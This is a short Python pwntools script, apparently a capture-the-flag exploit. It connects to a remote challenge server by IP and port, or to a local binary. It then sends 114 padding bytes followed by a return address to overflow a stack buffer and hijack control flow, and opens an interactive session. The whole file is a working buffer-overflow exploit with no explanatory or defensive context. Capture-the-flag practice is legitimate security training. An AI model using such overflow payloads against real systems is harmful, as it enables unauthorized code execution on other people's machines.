from pwn import *

#elf = context.binary = ELF("./vuln")
context.arch = 'amd64'
gs = '''
continue
'''

def start(server=True):
        if(server):
                return remote('167.71.207.218', 50602)
        else:

                return process(['./chl'])

io = start()

#io.recvuntil(">>")
a = "A"*114
a += "\x8b\x08\x40"
#0x4006b0
io.sendline(a)

io.interactive()
